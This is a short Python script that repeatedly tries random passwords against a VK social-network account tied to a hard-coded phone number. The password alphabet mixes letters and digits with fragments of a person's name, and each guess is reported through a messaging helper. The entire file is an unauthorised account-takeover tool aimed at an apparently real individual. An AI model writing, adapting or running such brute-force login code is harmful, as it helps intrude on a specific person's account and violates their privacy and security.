import vk_api
import random
import message
import time

chars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'zorina', 'ylia', 'yulia', '53', '22', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']



n = 0
o = 0

while True:
    print("Цикл запущен")

    if o == 1:
        print(F"yes- {password}")
        break

    password =''
    for i in range(random.randint(1, 16)):
        password += random.choice(chars)
    try:

        vk_session = vk_api.VkApi('+7508310927', password)
        vk_session.auth()
        print(password)

        vk = vk_session.get_api()

        o = 1

    except Exception:
        o = 0
        message.vk_send(F"no - {password}")

message.vk_send(password)